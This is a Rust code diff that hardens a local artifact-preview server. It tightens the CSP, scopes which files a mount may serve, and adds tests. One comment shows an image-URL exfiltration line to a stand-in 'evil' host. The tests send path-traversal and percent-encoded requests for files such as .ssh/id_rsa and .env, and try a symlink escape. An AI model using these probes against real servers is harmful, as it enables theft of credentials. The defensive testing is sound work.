@@ -27,7 +27,9 @@ use axum::routing::any;
 use axum::Router;
 use dashmap::DashMap;
 use tower::util::ServiceExt;
-use tower_http::services::ServeDir;
+use tower_http::services::ServeFile;
+
+use crate::viewer_guard::{self, MountScope};
 
 /// Iyke iframe bridge, bundled from `src/lib/iyke/iframe-bridge.entry.ts`
 /// via `bun run iyke:bundle` (chained from `bun run dev` and `bun run
@@ -78,12 +80,17 @@ const HTML_INJECT_MAX_BYTES: usize = 4 * 1024 * 1024;
 /// `connect-src` stays at `'self'` so artifacts can't make ad-hoc fetch()
 /// calls to arbitrary hosts; data must flow through declared dataSources
 /// (resolved by the shell bridge, not the iframe).
+///
+/// `img-src` and `media-src` carry no `https:` source: a previewed page can read
+/// files under its mount (`connect-src 'self'`), and an `https:` image or media
+/// URL is a write channel to any host (`new Image().src = "https://evil/?" + data`).
+/// Previews are in-app only, so nothing legitimate needs an external fetch.
 const VIEWER_CSP: &str = "default-src 'self' data: blob:; \
 script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net https://cdn.tailwindcss.com https://esm.sh https://cdn.skypack.dev; \
 style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net https://cdn.tailwindcss.com; \
-img-src 'self' data: blob: https:; \
+img-src 'self' data: blob:; \
 font-src 'self' data: https://fonts.gstatic.com https://cdn.jsdelivr.net; \
-media-src 'self' blob: https:; \
+media-src 'self' blob:; \
 connect-src 'self'";
 
 /// Default fixed port. Override with `IKENGA_VIEWER_PORT` if it conflicts.
@@ -98,6 +105,8 @@ pub const VIEWER_PATH_PREFIX: &str = "/__viewer";
 #[derive(Clone)]
 struct Mount {
     root: PathBuf,
+    /// What the mount may serve under `root` (see [`viewer_guard`]).
+    scope: MountScope,
 }
 
 pub struct ViewerServerManager {
@@ -118,10 +127,15 @@ impl ViewerServerManager {
     /// shell-origin-relative path like `/__viewer/<token>/`. Callers append
     /// the file path. The actual host:port is whatever the shell loads from
     /// (Vite in dev, localhost-plugin in prod), reached via proxy/route.
-    pub fn register(&self, root: PathBuf) -> (String, String) {
+    pub fn register(&self, root: PathBuf, scope: MountScope) -> (String, String) {
         let token = random_token_hex(32);
-        self.mounts
-            .insert(token.clone(), Mount { root: root.clone() });
+        self.mounts.insert(
+            token.clone(),
+            Mount {
+                root: root.clone(),
+                scope,
+            },
+        );
         let url = format!("{VIEWER_PATH_PREFIX}/{}/", token);
         tracing::info!(
             "viewer mount: serving {} at {} (token {})",
@@ -140,6 +154,22 @@ impl ViewerServerManager {
 
     pub fn bound_port(&self) -> Option<u16> {
         *self.bound_port.read().unwrap()
+    }
+
+    /// The `/__viewer/*` routes and their middleware stack, without the
+    /// frontend-asset fallback. Split out of `start` so tests drive the exact
+    /// router that is served.
+    pub(crate) fn viewer_router(&self) -> Router {
+        Router::new()
+            .route("/__viewer/:token/*path", any(serve_handler))
+            .route("/__viewer/:token", any(serve_handler_root))
+            // Health probe so the FE can confirm the server is up before
+            // mounting an iframe (avoids a flash of "viewer offline").
+            .route("/__viewer-health", any(health_handler))
+            .layer(middleware::from_fn(inject_artifact_bridge))
+            .layer(middleware::from_fn(inject_iyke_bridge))
+            .layer(middleware::from_fn(inject_security_headers))
+            .with_state(self.mounts.clone())
     }
 
     /// Spawn the singleton server. Idempotent: subsequent calls are no-ops
@@ -170,17 +200,7 @@ impl ViewerServerManager {
             .and_then(|s| s.parse().ok())
             .unwrap_or(DEFAULT_VIEWER_PORT);
 
-        let mounts = self.mounts.clone();
-        let viewer_router: Router = Router::new()
-            .route("/__viewer/:token/*path", any(serve_handler))
-            .route("/__viewer/:token", any(serve_handler_root))
-            // Health probe so the FE can confirm the server is up before
-            // mounting an iframe (avoids a flash of "viewer offline").
-            .route("/__viewer-health", any(health_handler))
-            .layer(middleware::from_fn(inject_artifact_bridge))
-            .layer(middleware::from_fn(inject_iyke_bridge))
-            .layer(middleware::from_fn(inject_security_headers))
-            .with_state(mounts);
+        let viewer_router = self.viewer_router();
 
         // Catch-all: serve the bundled frontend dist via Tauri's asset
         // resolver. Wrap in `Arc` because `AssetResolver<R>` is only `Clone`
@@ -276,7 +296,7 @@ async fn serve_handler(
     let Some(mount) = mounts.get(&token).map(|m| m.clone()) else {
         return (StatusCode::NOT_FOUND, "not found").into_response();
     };
-    serve_file(&mount.root, &path, req).await
+    serve_file(&mount, &path, req).await
 }
 
 async fn serve_handler_root(
@@ -287,42 +307,73 @@ async fn serve_handler_root(
     let Some(mount) = mounts.get(&token).map(|m| m.clone()) else {
         return (StatusCode::NOT_FOUND, "not found").into_response();
     };
-    serve_file(&mount.root, "index.html", req).await
+    serve_file(&mount, "index.html", req).await
 }
 
-async fn serve_file(root: &PathBuf, rel_path: &str, mut req: Request<Body>) -> Response {
-    // Reset the URI to just the relative path so ServeDir resolves correctly.
-    let uri_str = if rel_path.is_empty() {
-        "/".to_string()
-    } else {
-        format!("/{}", rel_path)
-    };
-    let new_uri = match uri_str.parse() {
-        Ok(u) => u,
-        Err(_) => return (StatusCode::BAD_REQUEST, "bad path").into_response(),
-    };
-    *req.uri_mut() = new_uri;
+async fn serve_file(mount: &Mount, rel_path: &str, req: Request<Body>) -> Response {
+    let not_found = || (StatusCode::NOT_FOUND, "not found").into_response();
 
-    let svc = ServeDir::new(root);
-    // ServeDir's error type is Infallible — unwrapping is safe.
-    match svc.oneshot(req).await {
+    // `rel_path` was percent-decoded exactly once, by the router. The file that
+    // is served is the canonical path the checks below ran on, never a path
+    // re-derived from a URI (a second decode would turn `lea%256b` into `leak`
+    // after the symlink check had passed).
+    let Some(mut target) = crate::server::viewer::safe_join(&mount.root, rel_path) else {
+        return not_found();
+    };
+    // Credential paths and, for a single-file mount, every path but the
+    // previewed file (directories included): a plain 404, before the directory
+    // redirect below could confirm that a directory exists.
+    if !viewer_guard::may_serve(&mount.scope, &target) {
+        return not_found();
+    }
+    if target.is_dir() {
+        // `sub` -> `sub/`, keeping the `/__viewer/<token>` prefix, so relative
+        // assets of `sub/index.html` resolve against the directory.
+        let uri_path = req.uri().path();
+        if !uri_path.ends_with('/') {
+            let mut location = format!("{uri_path}/");
+            if let Some(q) = req.uri().query() {
+                location.push('?');
+                location.push_str(q);
+            }
+            return Response::builder()
+                .status(StatusCode::TEMPORARY_REDIRECT)
+                .header(header::LOCATION, location)
+                .body(Body::empty())
+                .unwrap_or_else(|_| StatusCode::INTERNAL_SERVER_ERROR.into_response());
+        }
+        let index = format!("{}/index.html", rel_path.trim_end_matches('/'));
+        let Some(idx) = crate::server::viewer::safe_join(&mount.root, &index) else {
+            return not_found();
+        };
+        if !viewer_guard::may_serve(&mount.scope, &idx) {
+            return not_found();
+        }
+        target = idx;
+    }
+    if !target.is_file() {
+        return not_found();
+    }
+
+    // ServeFile sets Last-Modified/ETag but no Cache-Control, which lets the
+    // webview apply *heuristic* freshness and serve a stale artifact from
+    // memory — no request, so no revalidation, so an edited file never
+    // appears. Observed 2026-08-04: a rewritten artifact kept rendering its
+    // previous version across a pane refresh AND a brand-new tab, which reads
+    // as "my edit didn't save".
+    //
+    // `no-cache` still allows caching, it just forces revalidation, so the
+    // ETag path keeps 304s cheap. Artifacts are edited constantly — this is
+    // the same reasoning, and the same header, already applied to the shell's
+    // own assets above.
+    match ServeFile::new(&target).oneshot(req).await {
         Ok(resp) => {
             let mut resp = resp.into_response();
-            // ServeDir sets Last-Modified/ETag but no Cache-Control, which lets
-            // the webview apply *heuristic* freshness and serve a stale artifact
-            // from memory — no request, so no revalidation, so an edited file
-            // never appears. Observed 2026-08-04: a rewritten artifact kept
-            // rendering its previous version across a pane refresh AND a
-            // brand-new tab, which reads as "my edit didn't save".
-            //
-            // `no-cache` still allows caching, it just forces revalidation, so
-            // the ETag path keeps 304s cheap. Artifacts are edited constantly —
-            // this is the same reasoning, and the same header, already applied
-            // to the shell's own assets above.
             resp.headers_mut()
                 .insert(header::CACHE_CONTROL, HeaderValue::from_static("no-cache"));
             resp
         }
+        Err(_) => (StatusCode::INTERNAL_SERVER_ERROR, "serve failed").into_response(),
     }
 }
 
@@ -607,7 +658,14 @@ mod tests {
     /// exercise the real middleware ordering. Pass `root` as the only mount.
     fn router_for(token: &str, root: PathBuf) -> Router {
         let mounts: Arc<DashMap<String, Mount>> = Arc::new(DashMap::new());
-        mounts.insert(token.to_string(), Mount { root });
+        let root = root.canonicalize().unwrap();
+        mounts.insert(
+            token.to_string(),
+            Mount {
+                root,
+                scope: MountScope::Tree,
+            },
+        );
         Router::new()
             .route("/__viewer/:token/*path", any(serve_handler))
             .route("/__viewer/:token", any(serve_handler_root))
@@ -797,5 +855,144 @@ mod tests {
             csp.contains("script-src") && csp.contains("cdn.jsdelivr.net"),
             "CSP must allow the canonical artifact CDN; got: {csp}",
         );
+    }
+
+    /// The viewer CSP must not let a previewed page send what it read to an
+    /// outside host through an image or media URL.
+    #[test]
+    fn csp_has_no_external_image_or_media_sources() {
+        for d in VIEWER_CSP.split("; ") {
+            if d.starts_with("img-src") || d.starts_with("media-src") {
+                assert!(!d.contains("http"), "{d}");
+                assert!(!d.contains('*'), "{d}");
+            }
+        }
+        let csp = csp_for_host(VIEWER_CSP, "localhost:47821");
+        for d in csp.split("; ") {
+            if d.starts_with("img-src") || d.starts_with("media-src") {
+                assert!(
+                    !d.split_whitespace()
+                        .any(|t| t == "https:" || t == "http:" || t == "*"),
+                    "{d}"
+                );
+            }
+        }
+        assert!(VIEWER_CSP.contains("connect-src 'self'"));
+    }
+
+    async fn get(app: &Router, uri: &str) -> (StatusCode, Vec<u8>) {
+        let req = Request::builder()
+            .method(Method::GET)
+            .uri(uri)
+            .body(Body::empty())
+            .unwrap();
+        let resp = app.clone().oneshot(req).await.unwrap();
+        let st = resp.status();
+        let body = to_bytes(resp.into_body(), 4 * 1024 * 1024).await.unwrap();
+        (st, body.to_vec())
+    }
+
+    /// A single-file mount (a page straight in the home dir) serves the page
+    /// and nothing else; credential paths are a plain 404 in any mount.
+    #[tokio::test]
+    async fn single_file_mount_serves_only_its_page_and_credentials_are_404() {
+        let dir = tempfile::tempdir().unwrap();
+        let home = dir.path().canonicalize().unwrap();
+        fs::create_dir_all(home.join(".ssh")).unwrap();
+        fs::create_dir_all(home.join("proj/.claude")).unwrap();
+        fs::write(home.join(".ssh/id_rsa"), "FAKE-PRIVATE-KEY").unwrap();
+        fs::write(home.join("notes.txt"), "private notes").unwrap();
+        fs::write(home.join("evil.html"), "<p>evil</p>").unwrap();
+        fs::write(home.join("proj/index.html"), "<p>proj</p>").unwrap();
+        fs::write(home.join("proj/app.js"), "1").unwrap();
+        fs::write(home.join("proj/.env"), "SECRET=1").unwrap();
+        fs::write(home.join("proj/.claude/y"), "SECRET").unwrap();
+
+        let m = ViewerServerManager::new();
+        let (url, _) = m.register(home.clone(), MountScope::SingleFile(home.join("evil.html")));
+        let (purl, _) = m.register(home.join("proj"), MountScope::Tree);
+        let app = m.viewer_router();
+
+        let (st, body) = get(&app, &format!("{url}evil.html")).await;
+        assert_eq!(st, StatusCode::OK);
+        assert!(String::from_utf8_lossy(&body).contains("<p>evil</p>"));
+        for p in [
+            ".ssh/id_rsa",
+            "%2essh/id_rsa",
+            ".ssh%2fid_rsa",
+            "notes.txt",
+            "proj/index.html",
+            ".ssh",
+            ".ssh/",
+            "",
+        ] {
+            let (st, body) = get(&app, &format!("{url}{p}")).await;
+            assert_eq!(st, StatusCode::NOT_FOUND, "{p:?}");
+            assert!(!String::from_utf8_lossy(&body).contains("FAKE-"));
+        }
+
+        // A project tree mount: normal assets load, credentials do not.
+        for p in ["index.html", "app.js"] {
+            let (st, _) = get(&app, &format!("{purl}{p}")).await;
+            assert_eq!(st, StatusCode::OK, "{p:?}");
+        }
+        for p in [
+            ".env",
+            ".claude/y",
+            ".claude",
+            "../.ssh/id_rsa",
+            "%2e%2e/.ssh/id_rsa",
+        ] {
+            let (st, body) = get(&app, &format!("{purl}{p}")).await;
+            assert_ne!(st, StatusCode::OK, "{p}");
+            assert!(!String::from_utf8_lossy(&body).contains("SECRET"));
+        }
+        let (st, _) = get(&app, &format!("{purl}.env")).await;
+        assert_eq!(st, StatusCode::NOT_FOUND);
+    }
+
+    /// `../_shared` assets of a page resolve inside the project mount, and a
+    /// directory still redirects to its trailing slash and serves its index.
+    #[tokio::test]
+    async fn project_mount_serves_shared_assets_dirs_and_symlinks_stay_inside() {
+        let dir = tempfile::tempdir().unwrap();
+        let proj = dir.path().canonicalize().unwrap().join("proj");
+        fs::create_dir_all(proj.join("pages/deck")).unwrap();
+        fs::create_dir_all(proj.join("_shared")).unwrap();
+        fs::write(proj.join("_shared/t.css"), "a{}").unwrap();
+        fs::write(proj.join("pages/deck/index.html"), "<p>deck</p>").unwrap();
+        fs::write(
+            dir.path().canonicalize().unwrap().join("outside.txt"),
+            "TOPSECRET",
+        )
+        .unwrap();
+        #[cfg(unix)]
+        std::os::unix::fs::symlink(
+            dir.path().canonicalize().unwrap().join("outside.txt"),
+            proj.join("leak"),
+        )
+        .unwrap();
+
+        let m = ViewerServerManager::new();
+        let (url, _) = m.register(proj.clone(), MountScope::Tree);
+        let app = m.viewer_router();
+        let (st, body) = get(&app, &format!("{url}_shared/t.css")).await;
+        assert_eq!((st, &body[..]), (StatusCode::OK, &b"a{}"[..]));
+        let (st, _) = get(&app, &format!("{url}pages/deck/index.html")).await;
+        assert_eq!(st, StatusCode::OK);
+        let (st, _) = get(&app, &format!("{url}pages/deck/")).await;
+        assert_eq!(st, StatusCode::OK);
+        let req = Request::builder()
+            .uri(format!("{url}pages/deck"))
+            .body(Body::empty())
+            .unwrap();
+        let resp = app.clone().oneshot(req).await.unwrap();
+        assert_eq!(resp.status(), StatusCode::TEMPORARY_REDIRECT);
+        #[cfg(unix)]
+        {
+            let (st, body) = get(&app, &format!("{url}leak")).await;
+            assert_eq!(st, StatusCode::NOT_FOUND);
+            assert!(!String::from_utf8_lossy(&body).contains("TOPSECRET"));
+        }
     }
 }
